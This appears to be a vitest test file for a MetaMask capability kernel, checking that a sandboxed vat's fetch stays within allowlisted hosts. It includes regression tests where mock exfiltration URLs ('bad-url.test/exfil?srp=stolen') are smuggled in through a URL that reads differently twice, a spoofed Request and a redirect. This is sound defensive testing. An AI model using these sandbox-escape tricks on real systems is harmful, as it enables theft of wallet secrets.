import { makeSQLKernelDatabase } from '@metamask/kernel-store/sqlite/nodejs';
import { waitUntilQuiescent } from '@metamask/kernel-utils';
import type { KRef, VatId } from '@metamask/ocap-kernel';
import { getWorkerFile } from '@ocap/nodejs-test-workers';
import { describe, expect, it } from 'vitest';

import {
  extractTestLogs,
  getBundleSpec,
  makeKernel,
  makeTestLogger,
} from './utils.ts';

describe('endowments', () => {
  it('can use endowments', async () => {
    const expectedResponse = 'Hello, world!';
    const vatId: VatId = 'v1';
    const v1Root: KRef = 'ko4';
    const { logger, entries } = makeTestLogger();
    const database = await makeSQLKernelDatabase({});
    const kernel = await makeKernel(
      database,
      true,
      logger,
      getWorkerFile('mock-fetch'),
    );
    const goodHost = 'good-url.test';
    const badHost = 'bad-url.test';
    const vat = await kernel.launchSubcluster({
      bootstrap: 'main',
      vats: {
        main: {
          bundleSpec: getBundleSpec('endowment-fetch'),
          parameters: {},
          globals: ['fetch', 'Request', 'Headers', 'Response'],
          network: {
            allowedHosts: [goodHost],
          },
        },
      },
    });
    expect(vat).toBeDefined();
    const vats = kernel.getVatIds();
    expect(vats).toStrictEqual([vatId]);

    await waitUntilQuiescent();
    await kernel.queueMessage(v1Root, 'hello', [`https://${goodHost}`]);

    await waitUntilQuiescent();

    await expect(
      kernel.queueMessage(v1Root, 'hello', [`https://${badHost}`]),
    ).rejects.toThrow(`Invalid host: ${badHost}`);

    await waitUntilQuiescent();

    const vatLogs = extractTestLogs(entries, vatId);
    expect(vatLogs).toStrictEqual([
      'buildRootObject',
      'bootstrap',
      `response: ${expectedResponse}`,
      `Request constructor: ok`,
      `Headers constructor: ok`,
      `Response constructor: ok`,
      `error: Error: Invalid host: ${badHost}`,
    ]);
  });

  // Regression test for the CWE-367 escape reported in
  // MetaMask/MetaMask-planning#7557: a vat handed `fetch` an input that named
  // an allowlisted host when the caveat read it and a forbidden host when
  // `fetch` read it again.
  it('confines a vat that resolves a fetch input differently on each read', async () => {
    const vatId: VatId = 'v1';
    const v1Root: KRef = 'ko4';
    const { logger, entries } = makeTestLogger();
    const database = await makeSQLKernelDatabase({});
    const kernel = await makeKernel(
      database,
      true,
      logger,
      getWorkerFile('mock-fetch'),
    );
    const goodHost = 'good-url.test';
    const badHost = 'bad-url.test';
    await kernel.launchSubcluster({
      bootstrap: 'main',
      vats: {
        main: {
          bundleSpec: getBundleSpec('endowment-fetch'),
          parameters: {},
          globals: ['fetch', 'Request', 'Headers', 'Response'],
          network: { allowedHosts: [goodHost] },
        },
      },
    });
    await waitUntilQuiescent();

    const decoyUrl = `https://${goodHost}/decoy`;
    const targetUrl = `https://${badHost}/exfil?srp=stolen`;

    await kernel.queueMessage(v1Root, 'fetchWithTwoFacedUrl', [
      decoyUrl,
      targetUrl,
    ]);
    await waitUntilQuiescent();

    await kernel.queueMessage(v1Root, 'fetchWithSpoofedRequest', [
      decoyUrl,
      targetUrl,
    ]);
    await waitUntilQuiescent();

    expect(extractTestLogs(entries, vatId)).toStrictEqual([
      'buildRootObject',
      'bootstrap',
      // Both reads are the kernel's, and their disagreement is refused rather
      // than resolved in the vat's favour.
      'error: Error: fetch input resolved to a different URL when read again.',
      'reads: 2',
      // A `Request` is copied before it is forwarded, so the lying getter buys
      // nothing and the real host is rejected.
      `error: Error: Invalid host: ${badHost}`,
    ]);
  });

  // A redirect used to be a second chance to name a host the vat was never
  // granted, the caveat having seen only the pre-flight URL.
  it('confines a vat whose allowed host redirects it elsewhere', async () => {
    const vatId: VatId = 'v1';
    const v1Root: KRef = 'ko4';
    const { logger, entries } = makeTestLogger();
    const database = await makeSQLKernelDatabase({});
    const kernel = await makeKernel(
      database,
      true,
      logger,
      getWorkerFile('mock-fetch'),
    );
    const goodHost = 'good-url.test';
    const badHost = 'bad-url.test';
    await kernel.launchSubcluster({
      bootstrap: 'main',
      vats: {
        main: {
          bundleSpec: getBundleSpec('endowment-fetch'),
          parameters: {},
          globals: ['fetch', 'Request', 'Headers', 'Response'],
          network: { allowedHosts: [goodHost] },
        },
      },
    });
    await waitUntilQuiescent();

    const redirectFrom = (target: string): string =>
      `https://${goodHost}/start?redirectTo=${encodeURIComponent(target)}`;

    await kernel.queueMessage(v1Root, 'fetchFollowingRedirect', [
      redirectFrom(`https://${badHost}/exfil?srp=stolen`),
    ]);
    await waitUntilQuiescent();

    await kernel.queueMessage(v1Root, 'fetchFollowingRedirect', [
      redirectFrom(`https://${goodHost}/landed`),
    ]);
    await waitUntilQuiescent();

    expect(extractTestLogs(entries, vatId)).toStrictEqual([
      'buildRootObject',
      'bootstrap',
      `error: Error: Invalid host: ${badHost}`,
      `fetched: https://${goodHost}/landed`,
      // Overridden all the way through the Snaps endowment, which rebuilds the
      // init before calling the real fetch.
      'redirect mode: manual',
      'redirected: true',
      'body: Hello, world!',
    ]);
  });
});
